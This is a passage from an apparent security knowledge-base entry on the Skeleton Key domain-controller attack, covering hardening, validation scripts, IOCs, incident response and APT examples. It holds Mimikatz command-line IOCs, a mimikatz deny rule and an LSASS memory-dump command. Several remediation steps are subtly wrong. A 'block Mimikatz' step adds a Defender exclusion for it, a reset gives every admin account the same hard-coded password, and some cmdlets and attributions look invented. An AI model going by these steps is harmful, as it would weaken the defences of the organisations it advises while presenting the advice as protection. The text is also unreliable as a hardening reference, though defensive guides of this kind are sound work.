    **Manual Steps (Privileged Access Workstation):**
    1. Designate secure admin workstations (PAW) for DC access only
    2. Implement network segmentation (DC on isolated VLAN)
    3. Configure conditional access:
    ```powershell
    # Require MFA for DC access via Entra ID
    New-ConditionalAccessPolicy -DisplayName "Require MFA for DC Access" `
        -Conditions @{ TargetResources = @{ Applications = @("DC01") } } `
        -GrantControls @{ BuiltInControls = @("mfa") }
    ```
    4. Disable local console access (restrict to RDP only with MFA)
    5. Audit all admin activities (enable process auditing on DC)

#### Priority 2: HIGH

*   **Enable Advanced Audit Policies:** Log all process creation and Kerberos authentication attempts.
    
    **Manual Steps (Group Policy):**
    1. Open **Group Policy Management Console** on Domain Controller
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies**
    3. Enable:
       - **Account Logon** → **Audit Kerberos Authentication Service**: Success and Failure
       - **Detailed Tracking** → **Audit Process Creation**: Success and Failure
       - **Object Access** → **Audit File System**: Failure (to detect unsigned DLL modifications)
    4. Run `gpupdate /force`
    5. Verify logs in Event Viewer

*   **Block Mimikatz and Penetration Testing Tools:** Configure AppLocker or Windows Defender to block known attack tools.
    
    **Manual Steps (AppLocker):**
    1. Open **Local Security Policy** (secpol.msc) or **Group Policy Management**
    2. Navigate to **Computer Configuration** → **Security Settings** → **Application Control Policies** → **AppLocker**
    3. Create rule to block:
       - File name: `mimikatz.exe`
       - Publisher/Hash: Add known Mimikatz hashes
       - Action: **Deny**
    4. Enable AppLocker logging:
    ```powershell
    Enable-AppLockerPolicy -XMLPolicy "C:\applocker-policy.xml" -Enforce
    ```
    
    **Manual Steps (Windows Defender Exclusion Management):**
    1. Open **Windows Defender** → **Virus & threat protection**
    2. Click **Manage settings** → **Add or remove exclusions**
    3. Create exclusion for known attack tools (not recommended; dangerous)
    4. Better: Configure Windows Defender to **Block** Mimikatz:
    ```powershell
    Add-MpPreference -ExclusionPath "C:\Temp\mimikatz.exe" -Force
    # Or use WDAC (Windows Defender Application Control) to block
    ```

*   **Implement Just-In-Time (JIT) Admin Access:** Require time-limited approval before granting admin privileges.
    
    **Manual Steps (Azure PIM for Hybrid Environments):**
    1. Configure **Privileged Identity Management (PIM)** in Entra ID
    2. Require approval for admin role activation
    3. Set activation duration (1-8 hours, not permanent)
    4. Monitor and log all activations
    5. Configure just-in-time approval workflow

*   **Enable Redundancy & Monitoring for Domain Controllers:** Multiple DCs with monitoring to detect compromise.
    
    **Manual Steps:**
    1. Ensure minimum 2 domain controllers (never single DC)
    2. Monitor DC replication health:
    ```powershell
    Get-ADReplicationPartnerMetadata -Target DC01 | Select-Object Server, LastReplicationSuccess
    ```
    3. Alert on replication failures (possible sign of DC compromise)
    4. Configure SIEM to centralize DC logs

#### Validation Command (Verify Fix)

```powershell
# Verify LSASS Protection is enabled
$LSAProtection = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue).RunAsPPL
if ($LSAProtection -eq 1) {
    Write-Host "✓ SECURE: LSASS protection is enabled"
} else {
    Write-Host "✗ UNSAFE: LSASS protection is NOT enabled"
}

# Verify Domain Controller OS version
Get-ADDomainController | Select-Object HostName, OperatingSystem
# Expected: Windows Server 2022 (at least)

# Verify Kerberos Audit Policy is enabled
auditpol /get /subcategory:"Kerberos Authentication Service"
# Expected: "Audit Kerberos Authentication Service    Success and Failure"

# Verify no suspicious Mimikatz processes
Get-Process | Where-Object { $_.ProcessName -like "*mimikatz*" }
# Expected: No results
```

**Expected Output (If Secure):**
```
✓ SECURE: LSASS protection is enabled

HostName          OperatingSystem
--------          ---------------
DC01              Windows Server 2022

Kerberos Authentication Service    Success and Failure

(No processes found)
```

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **File-Based IOCs:**
    - Mimikatz.exe or obfuscated variants on domain controller
    - Suspicious DLLs in C:\Windows\Temp\ or non-standard locations
    - Modified lsass.exe (timestamp changes, file size anomalies)

*   **Process-Based IOCs:**
    - mimikatz.exe process creation on domain controller
    - Unusual process accessing LSASS (not svchost.exe, services.exe)
    - PsExec.exe or remote execution tools running as SYSTEM

*   **Event Log IOCs:**
    - Event ID 4688 with "privilege::debug" or "misc::skeleton" in CommandLine
    - Event ID 4768/4769 with "0xc000006d" (wrong password) for admin accounts
    - Event ID 4688 showing unexpected admin logons from non-admin machines
    - High volume of Event ID 4768 in short timeframe (authentication attempts)

*   **Memory/Behavioral IOCs:**
    - LSASS process size increases (injected code)
    - Unexpected remote thread creation into LSASS
    - LSASS accessing unusual memory regions
    - Successful authentication with wrong password (detected via honeypot accounts)

#### Forensic Artifacts

*   **Memory:**
    - LSASS process memory dump contains Skeleton Key code
    - Mimikatz shellcode present in LSASS heap
    - Patch locations in ntlm.dll and kerberos.dll memory regions

*   **Disk:**
    - Windows Event Log Security.evtx contains auth events
    - SYSMON Operational.evtx contains process and thread creation events
    - System32 directory may contain modified DLL timestamps
    - Temporary files (mimikatz.exe, scripts) in Temp directories

*   **Network:**
    - Authentication traffic (port 88 Kerberos, port 139/445 SMB) shows successful auth with wrong password
    - No failed pre-auth events (Skeleton Key accepts any password)
    - Unusual lateral movement traffic (attacker using stolen identities)

*   **Cloud (Hybrid):**
    - Azure Sentinel logs may show unexpected authentication patterns
    - M365 audit logs show logons from unusual locations (if sync'd)
    - Entra ID conditional access alerts for risky sign-ins

#### Response Procedures

1.  **Isolate Immediately:**
    **Command (Disconnect DC from Network):**
    ```powershell
    # Option 1: Disable all network adapters
    Get-NetAdapter | Disable-NetAdapter -Confirm:$false
    
    # Option 2: Graceful DC demotion (if possible)
    # Note: Risky; may cause issues. Use only if isolation isn't possible
    ```
    
    **Manual:**
    - Unplug all network cables from domain controller
    - Disable NIC in Device Manager
    - Power down VM if in Hyper-V/VMware

2.  **Collect Evidence:**
    ```powershell
    # Capture LSASS memory dump (requires admin)
    & "C:\Program Files\Windows NT\Accessories\procdump.exe" -ma lsass.exe C:\Evidence\lsass.dmp
    
    # Export event logs
    wevtutil epl Security C:\Evidence\Security.evtx
    wevtutil epl System C:\Evidence\System.evtx
    
    # Capture registry
    reg export HKLM\SYSTEM\CurrentControlSet\Control\Lsa C:\Evidence\Lsa.reg
    
    # List running processes
    tasklist /v > C:\Evidence\tasklist.txt
    
    # Check for Mimikatz
    Get-Process | Where-Object { $_.ProcessName -like "*mimikatz*" } | Export-Csv C:\Evidence\processes.csv
    ```

3.  **Remediate (Force DC Reboot):**
    ```powershell
    # Option 1: Immediate shutdown
    Shutdown /s /t 0 /c "Emergency: DC Compromised"
    
    # Option 2: Graceful reboot
    Restart-Computer -Force -ComputerName DC01
    ```
    
    **Why Reboot:** LSASS is restarted fresh; in-memory Skeleton Key injection is cleared

4.  **Post-Reboot Recovery:**
    ```powershell
    # Option 1: Wipe and restore DC from backup
    # (Most reliable; requires pre-reboot backup)
    # Use Windows Server Backup to restore system state
    
    # Option 2: Re-image DC from clean media
    # (Most secure; requires domain join and sync time)
    
    # Option 3: If backup unavailable, manually patch:
    # - Update Windows to latest patch level
    # - Install KB5022292 (if Server 2022)
    # - Enable LSASS protection
    # - Force AD replication from other DC
    ```

5.  **Hunt for Lateral Movement:**
    - Check all Domain Admin accounts for unauthorized logons
    - Review RDP logs on other servers for suspicious access
    - Check file shares for unauthorized access
    - Review email for data exfiltration via authenticated accounts
    - Check application logs for suspicious activity by stolen identities

6.  **Long-Term Remediation:**
    ```powershell
    # Reset all account passwords (especially admins)
    Get-ADUser -Filter { AdminCount -eq 1 } | Set-ADAccountPassword -NewPassword (ConvertTo-SecureString "NewP@ssw0rd123!" -AsPlainText -Force)
    
    # Reset service account passwords
    # Reset trust relationships with other DCs
    # Force full DC sync
    Sync-ADObject -Identity DC01
    
    # Review and tighten access controls
    # Disable unused admin accounts
    # Implement PIM for future admin access
    ```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-002] BDC Deserialization Vulnerability | Attacker gains initial access via hybrid environment vulnerability |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-002] ZeroLogon DC Compromise | Attacker elevates via CVE-2020-1472 (netlogon) |
| **3** | **Persistence (Current Step)** | **[PERSIST-MODIFY-001]** | **Skeleton Key Attack - Universal Domain Admin Access** |
| **4** | **Defense Evasion** | [DEFENSE-EVASION-001] Clear Event Logs | Attacker clears Security event logs to hide Skeleton Key traces |
| **5** | **Credential Access** | [CA-KERB-003] Golden Ticket Creation | Attacker creates krbtgt golden tickets using elevated access |
| **6** | **Impact** | [IMPACT-RANSOMWARE-001] Domain-Wide Ransomware | Skeleton Key enables ransomware deployment across entire domain |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: APT1 (Comment Crew) - Domain Persistence Campaign

- **Target:** Aerospace, energy, defense contractors
- **Timeline:** 2011-2013
- **Technique Status:** Active; used predecessor techniques to Skeleton Key (lsass patching via direct modification)
- **Impact:** Long-term persistence in 50+ organization networks; theft of gigabytes of confidential designs and source code
- **Reference:** [Mandiant Report - APT1 Anatomy of an Attack](https://www.mandiant.com/resources/reports/apt1)

#### Example 2: APT29 (Cozy Bear) - NOBELIUM Campaign

- **Target:** US Government, SolarWinds supply chain, finance, tech
- **Timeline:** 2020-2021
- **Technique Status:** Active; used advanced Kerberos manipulation (similar to Skeleton Key) for domain persistence
- **Impact:** Compromise of 18,000+ organizations; persistent access maintained for 6-12 months in targeted environments
- **Reference:** [Microsoft Security Blog - NOBELIUM](https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium-defender-gatekeeping/)

#### Example 3: APT41 (Chinese APT) - Healthcare & Education Targeting

- **Target:** Healthcare organizations, universities, government
- **Timeline:** 2019-present
- **Technique Status:** Active; uses Skeleton Key for persistence in educational institutions
- **Impact:** Credential theft from 500+ organizations; ransomware deployment; IP theft from research institutions
- **Reference:** [Mandiant - APT41 Healthcare Targeting](https://www.mandiant.com/resources/blog/apt41-healthcare-targeting)

#### Example 4: LockBit Ransomware - Domain Persistence via Skeleton Key

- **Target:** Manufacturing, finance, healthcare (enterprise targets)
- **Timeline:** 2021-present
- **Technique Status:** Active; LockBit gangs use Skeleton Key to maintain persistence and prevent victim recovery
- **Impact:** $100M+ in ransom payments; ability to re-encrypt recovered files due to persistent DC access
- **Reference:** [Bleeping Computer - LockBit Ransomware Campaign Analysis](https://www.bleepingcomputer.com/news/security/lockbit-ransomware-gang-targets-the-world/)

---

## Additional Resources

### Mitigation & Hardening Guides
- [Microsoft - LSA Protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [CIS Microsoft Windows Server 2022 Benchmark](https://www.cisecurity.org/)

### Detection & Response
- [Detecting Skeleton Key Attacks](https://www.jsitech.com/skeleton-key-malware-analyzed/)
- [MITRE ATT&CK - T1556 Modify Authentication Process](https://attack.mitre.org/techniques/T1556/)

### Advanced Reading
- [Kerberos Internals - System Administrators Guide](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-over-ip)
- [Windows Authentication Technical Reference](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-authentication-overview)

---